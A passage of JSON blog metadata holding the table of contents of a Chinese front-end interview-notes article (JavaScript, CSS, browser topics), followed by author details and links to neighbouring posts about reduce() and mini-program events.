class=\"toc-text\">9、Arguments 对象</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#10%E3%80%81Document-%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">10、Document 对象</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Document-%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">Document 对象属性和方法</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#11%E3%80%81JS%E4%B8%AD%E9%98%BB%E6%AD%A2%E5%86%92%E6%B3%A1%E4%BA%8B%E4%BB%B6\"><span class=\"toc-text\">11、JS中阻止冒泡事件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#12%E3%80%81%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6\"><span class=\"toc-text\">12、阻止默认事件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#13%E3%80%81window-location\"><span class=\"toc-text\">13、window.location</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Location-%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">Location 对象属性</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Location-%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">Location 对象方法</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#14%E3%80%81%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE\"><span class=\"toc-text\">14、原型与原型链</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E5%9E%8B-prototype\"><span class=\"toc-text\">原型 prototype</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E5%9E%8B%E9%93%BE%EF%BC%9A-proto\"><span class=\"toc-text\">原型链：_proto_</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%84%E7%BC%96%E8%AF%91\"><span class=\"toc-text\">预编译</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#15%E3%80%81this\"><span class=\"toc-text\">15、this</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8\"><span class=\"toc-text\">函数直接调用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">对象方法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B%EF%BC%9A\"><span class=\"toc-text\">案例：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E4%B8%ADthis\"><span class=\"toc-text\">箭头函数中this</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#this%E6%8C%87%E5%90%91%EF%BC%88%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E3%80%81%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%EF%BC%89\"><span class=\"toc-text\">this指向（普通函数、箭头函数）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#16%E3%80%81%E9%97%AD%E5%8C%85\"><span class=\"toc-text\">16、闭包</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%BD%A2%E5%BC%8F%EF%BC%9A\"><span class=\"toc-text\">形式：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%84%8F%E4%B9%89%EF%BC%9A\"><span class=\"toc-text\">意义：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#17%E3%80%81ES6\"><span class=\"toc-text\">17、ES6</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#var-let-const\"><span class=\"toc-text\">var let const</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#var\"><span class=\"toc-text\">var:</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#const\"><span class=\"toc-text\">const:</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%84\"><span class=\"toc-text\">解构</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%BB%E9%87%8D\"><span class=\"toc-text\">去重</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#promise\"><span class=\"toc-text\">promise</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#18%E3%80%81xss\"><span class=\"toc-text\">18、xss</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#19%E3%80%81SEO\"><span class=\"toc-text\">19、SEO</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#20%E3%80%81%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D\"><span class=\"toc-text\">20、数组去重</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#21%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E4%BC%AA%E6%95%B0%E7%BB%84%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">21、数组和伪数组的区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#22%E3%80%81%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85\"><span class=\"toc-text\">22、手写一个发布订阅</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#23%E3%80%81%E4%BB%8B%E7%BB%8D%E4%B8%8B-Set%E3%80%81Map%E3%80%81WeakSet-%E5%92%8C-WeakMap-%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F\"><span class=\"toc-text\">23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#24%E3%80%81%E7%AE%80%E5%8D%95%E8%AF%B4%E8%AF%B4-js-%E4%B8%AD%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E7%9A%84%E6%83%85%E5%86%B5\"><span class=\"toc-text\">24、简单说说 js 中有哪几种内存泄露的情况</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#25%E3%80%81json%E5%92%8Cxml%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">25、json和xml数据的区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#26%E3%80%81JavaScript%E6%9C%89%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A4%E6%96%AD%E5%8F%98%E9%87%8F%E7%9A%84%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">26、JavaScript有几种方法判断变量的类型?</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#27%E3%80%81Math\"><span class=\"toc-text\">27、Math</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Math-%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">Math 对象方法</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#28%E3%80%81promise%E5%92%8C-async-await-%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">28、promise和 async await 区别</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%B8%A4%E8%80%85%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">两者的区别</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#29%E3%80%81-defer%E5%92%8Casync%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">29、 defer和async区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#30%E3%80%81%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5\"><span class=\"toc-text\">30、同步和异步</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#31%E3%80%81-%E5%AE%9E%E7%8E%B0%E5%BC%82%E6%AD%A5%E7%9A%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">31、 实现异步的方法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#32%E3%80%81-promise%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">32、 promise的介绍与使用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#33%E3%80%81%E7%94%A8js%E5%AE%9E%E7%8E%B0sleep%EF%BC%8C%E7%94%A8promise\"><span class=\"toc-text\">33、用js实现sleep，用promise</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#34%E3%80%81js%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E6%B6%89%E5%8F%8A%E5%88%B0settimeout%E3%80%81console%E3%80%81process-nextTick%E3%80%81promise-then\"><span class=\"toc-text\">34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#35%E3%80%81call-appy-bind%E7%9A%84%E4%BD%9C%E7%94%A8%E5%92%8C%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">35、call appy bind的作用和区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#36%E3%80%81%E7%BB%A7%E6%89%BF%EF%BC%8C%E4%BC%98%E7%BC%BA%E7%82%B9\"><span class=\"toc-text\">36、继承，优缺点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#37%E3%80%81ES5-js%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E4%BC%98%E7%BC%BA%E7%82%B9\"><span class=\"toc-text\">37、ES5 js继承的方法和优缺点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#38%E3%80%81ES6%E7%BB%A7%E6%89%BF\"><span class=\"toc-text\">38、ES6继承</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#39%E3%80%81%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C%E7%AC%A6%E2%80%A6\"><span class=\"toc-text\">39、扩展操作符…</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#40%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88js%E6%98%AF%E5%8D%95%E7%BA%BF%E7%A8%8B\"><span class=\"toc-text\">40、为什么js是单线程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#41%E3%80%81%E6%AD%BB%E9%94%81\"><span class=\"toc-text\">41、死锁</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#42%E3%80%81%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%B8%89%E4%B8%AA%E7%89%B9%E5%BE%81%EF%BC%8C%E5%88%86%E5%88%AB%E8%AF%B4%E4%B8%80%E4%B8%8B%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D\"><span class=\"toc-text\">42、面向对象的三个特征，分别说一下什么意思</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#43%E3%80%81%E9%98%B2%E6%8A%96%E5%92%8C%E8%8A%82%E6%B5%81%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">43、防抖和节流的原理和使用场景</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#44%E3%80%81%E6%96%87%E4%BB%B6%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0\"><span class=\"toc-text\">44、文件异步上传怎么实现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%99%AE%E9%80%9A%E8%A1%A8%E5%8D%95%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">1.普通表单上传</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">2.文件编码上传</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-formData%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">3.formData异步上传</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-iframe%E6%97%A0%E5%88%B7%E6%96%B0%E9%A1%B5%E9%9D%A2\"><span class=\"toc-text\">4.iframe无刷新页面</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#parent%EF%BC%8C%E5%9C%A8%E7%88%B6%E7%AA%97%E5%8F%A3%E6%89%93%E5%BC%80\"><span class=\"toc-text\">_parent，在父窗口打开</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#45%E3%80%81%E4%BD%BF%E7%94%A8setInterval%E8%AF%B7%E6%B1%82%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%94%E5%9B%9E%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3\"><span class=\"toc-text\">45、使用setInterval请求实时数据，返回顺序不一致怎么解决</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#46%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%8C%E6%B7%B1%E6%8B%B7%E8%B4%9D-%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">46、浅拷贝，深拷贝(实现方式)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#47%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2url\"><span class=\"toc-text\">47、获取当前页面url</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#48%E3%80%81js%E4%B8%AD%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E6%80%8E%E4%B9%88%E5%8F%96%E4%BA%A4%E9%9B%86-%E5%B7%AE%E9%9B%86%E3%80%81%E5%B9%B6%E9%9B%86%E3%80%81%E8%A1%A5%E9%9B%86\"><span class=\"toc-text\">48、js中两个数组怎么取交集+(差集、并集、补集)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ES5%EF%BC%9A\"><span class=\"toc-text\">ES5：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ES6%EF%BC%9A\"><span class=\"toc-text\">ES6：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#49%E3%80%81%E6%B2%99%E7%AE%B1%E9%9A%94%E7%A6%BB%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%E4%BB%80%E4%B9%88%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">49、沙箱隔离怎么做的什么原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#53%E3%80%81%E9%97%AD%E5%8C%85%E7%9A%84%E7%90%86%E8%A7%A3\"><span class=\"toc-text\">53、闭包的理解</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JS%E5%BA%94%E7%94%A8%E7%AF%87\"><span class=\"toc-text\">JS应用篇</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D%E9%80%86%E5%BA%8F%E8%BE%93%E5%87%BA%EF%BC%88%E6%89%8B%E5%86%99%EF%BC%89\"><span class=\"toc-text\">字符串中的单词逆序输出（手写）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#function-rand-min-max-N-%EF%BC%9A%E7%94%9F%E6%88%90%E9%95%BF%E5%BA%A6%E6%98%AFN%EF%BC%8C%E4%B8%94%E5%9C%A8min%E3%80%81max%E5%86%85%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B4%E6%95%B0%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%84\"><span class=\"toc-text\">function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Math-random\"><span class=\"toc-text\">Math.random</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%BB%E9%87%8D%EF%BC%8C%E7%9B%B8%E5%90%8Cvalue%E7%9A%84%E5%8F%AA%E4%BF%9D%E7%95%99%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%9C%80%E5%A5%BD%E6%9C%89%E5%A4%9A%E4%B8%AA%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BC%A0%E5%85%A5-1-2-3-4-5-%EF%BC%8C%E8%BF%94%E5%9B%9E-1-2-3-4-5\"><span class=\"toc-text\">传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%AD%A3%E5%88%99%E5%92%8C%E9%9D%9E%E6%AD%A3%E5%88%99%E5%AE%9E%E7%8E%B012345678-12-x3D-%E3%80%8B12%EF%BC%8C345%EF%BC%8C678-12\"><span class=\"toc-text\">用正则和非正则实现12345678.12&#x3D;》12，345，678.12</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%99%E4%B8%80%E4%B8%AA%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E7%A9%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">写一个判断是否是空对象的函数</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E8%AF%B7%E4%BD%A0%E6%89%BE%E5%87%BA%E5%85%B6%E4%B8%AD%E4%B8%8D%E5%90%AB%E6%9C%89%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84-%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2-%E7%9A%84%E9%95%BF%E5%BA%A6\"><span class=\"toc-text\">给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C\"><span class=\"toc-text\">三数之和</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A%E9%A2%98\"><span class=\"toc-text\">代码解释题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A8%A1%E5%9D%97%E5%8C%96\"><span class=\"toc-text\">模块化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CommonJS%E8%A7%84%E8%8C%83\"><span class=\"toc-text\">CommonJS规范</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ES6-module-%E5%92%8C-CommonJS-module-%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">ES6 module 和 CommonJS module 的区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ES6-module%E3%80%81CommonJS-module-%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">ES6 module、CommonJS module 循环引用的问题</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Css\"><span class=\"toc-text\">Css:</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E6%9C%AA%E7%9F%A5%E9%AB%98%E5%BA%A6%E5%85%83%E7%B4%A0%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E3%80%81%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F\"><span class=\"toc-text\">1、未知高度元素垂直居中、垂直居中的实现方式有哪些？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81padding-margin-%E7%99%BE%E5%88%86%E6%AF%94%E5%8D%95%E4%BD%8D%E4%BE%9D%E6%8D%AE\"><span class=\"toc-text\">2、padding , margin 百分比单位依据</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF-1px-%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">3、移动端 1px 问题</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81BFC\"><span class=\"toc-text\">4、BFC</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D%E6%96%B9%E6%A1%88\"><span class=\"toc-text\">5、移动端适配方案</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81css3%E6%96%B0%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">6、css3新特性</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B5%8F%E8%A7%88%E5%99%A8\"><span class=\"toc-text\">浏览器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81localStorage-%E8%83%BD%E8%B7%A8%E5%9F%9F%E5%90%97\"><span class=\"toc-text\">1、localStorage 能跨域吗</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5URL%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88\"><span class=\"toc-text\">2、浏览器输入URL发生了什么</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E9%87%8D%E7%BB%98%E3%80%81%E9%87%8D%E6%8E%92%E5%8C%BA%E5%88%AB%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D\"><span class=\"toc-text\">3、重绘、重排区别如何避免</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81let-a-x3D-%E2%80%9Csssssss%E2%80%9D%EF%BC%8C%E5%88%86%E5%88%AB%E5%AD%98%E5%9C%A8%E5%93%AA%E5%84%BF%EF%BC%9F\"><span class=\"toc-text\">4、let a &#x3D; “sssssss”，分别存在哪儿？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">5、浏览器垃圾回收机制</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E4%BF%9D%E6%8C%81%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1\"><span class=\"toc-text\">6、有什么方法可以保持前后端实时通信</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81%E4%BC%9A%E9%98%BB%E5%A1%9Edom%E8%A7%A3%E6%9E%90%E7%9A%84%E8%B5%84%E6%BA%90%E6%9C%89%EF%BC%9A\"><span class=\"toc-text\">7、会阻塞dom解析的资源有：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#h5%E6%96%B0%E7%89%B9%E6%80%A7\"><span class=\"toc-text\">h5新特性</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B5%8F%E8%A7%88%E5%99%A89%E7%A7%8D%E7%BC%93%E5%AD%98%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">浏览器9种缓存方式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%A7%E5%89%8D%E7%AB%AF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F\"><span class=\"toc-text\">大前端是什么？</span></a></li></ol>","author":{"name":"kif","slug":"blog-author","avatar":"https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png","link":"/","description":"时间再拉长一点，让我有时间收拾一下心情","socials":{"github":"https://github.com/wkif","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/qq_54739682?type=blog","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JS数组reduce()方法详解及高级技巧","uid":"0dd2f8e1d48b223c2f63dbed14392a9e","slug":"JS数组reduce-方法详解及高级技巧","date":"2022-05-23T03:47:00.000Z","updated":"2022-05-23T03:50:09.955Z","comments":true,"path":"api/articles/JS数组reduce-方法详解及高级技巧.json","keywords":null,"cover":"https://kifimg.oss-cn-beijing.aliyuncs.com/imgforhexo/20201202142640.jpg","text":" reduce()方法可以搞定的东西，for循环，或者forEach方法有时候也可以搞定，那为啥要用reduce()？这个问题，之前我也想过，要说原因还真找不到，唯一能找到的是：通往成功的道路有很多，但是总有一条路是最捷径的，亦或许reduce()逼格更高… 1、语法arr.re...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":19,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"Javascript","slug":"Javascript","count":2,"path":"api/tags/Javascript.json"}],"author":{"name":"kif","slug":"blog-author","avatar":"https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png","link":"/","description":"时间再拉长一点，让我有时间收拾一下心情","socials":{"github":"https://github.com/wkif","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/qq_54739682?type=blog","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别","uid":"add7208ee63417129b8b6e45029f606b","slug":"小程序事件之bind-、catch-、capture-bind和capture-catch的区别","date":"2022-05-22T12:34:00.000Z","updated":"2022-05-22T12:38:33.970Z","comments":true,"path":"api/articles/小程序事件之bind-、catch-、capture-bind和capture-catch的区别.json","keywords":null,"cover":"https://kifimg.oss-cn-beijing.aliyuncs.com/project/202205222038395.jpg","text":"小程序事件之bind 、catch 、capture-bind和capture-catch的区别事件分类事件分为冒泡事件和非冒泡事件 冒泡事件：当一个组件上的事件被触发后，该事件会向父节点传递。 非冒泡事件：当一个组件上的事件被触发后，该事件不会向父节点传递。 事件的绑定： bi...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 